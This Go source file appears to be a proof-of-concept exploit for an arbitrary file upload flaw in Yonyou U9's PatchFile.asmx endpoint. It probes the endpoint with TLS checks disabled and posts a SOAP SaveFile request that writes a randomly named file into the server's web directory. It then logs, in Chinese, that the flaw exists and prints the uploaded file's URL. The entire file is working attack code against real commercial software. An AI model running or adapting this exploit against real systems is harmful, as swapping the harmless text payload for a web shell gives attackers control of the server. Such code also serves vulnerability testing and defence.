package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func CheckVuln(target string) bool {
	url := strings.TrimRight(target, "/")
	req, err := http.NewRequest("GET", url+"/CS/Office/AutoUpdates/PatchFile.asmx?op=SaveFile", nil)
	if err != nil {
		log.Println(err)
		return false
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		return true
	} else {
		return false
	}
}

func U9UploadFile(target string) {
	url := strings.TrimRight(target, "/")
	if CheckVuln(url) == true {
		filename := RandStringBytes(5) + ".txt"
		data := "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SaveFile xmlns=\"http://tempuri.org/\">\n      <binData>QXJlIHlhIHJlYWR5IGtpZHM/</binData>\n      <path>./</path>\n      <fileName>" + filename + "</fileName>\n    </SaveFile>\n  </soap:Body>\n</soap:Envelope>"
		req, err := http.NewRequest("POST", url+"/CS/Office/AutoUpdates/PatchFile.asmx", bytes.NewBufferString(data))
		req.Header.Set("Content-Type", "text/xml; charset=utf-8")
		if err != nil {
			log.Println(err)
			return
		}
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr}
		resp, err := client.Do(req)
		if err != nil {
			log.Println(err)
			return
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Println("获取请求失败：", err)
		}
		msg := regexp.MustCompile("<SaveFileResult>true</SaveFileResult>").MatchString(string(body))
		if resp.StatusCode == http.StatusOK && msg {
			log.Println("[+] 存在用友U9 PatchFile.asmx 接口存在任意文件上传。")
			log.Println("[+] 上传文件路径：" + url + "/CS/Office/AutoUpdates/" + filename)

		} else {
			log.Println("Not found")
		}
	}
}
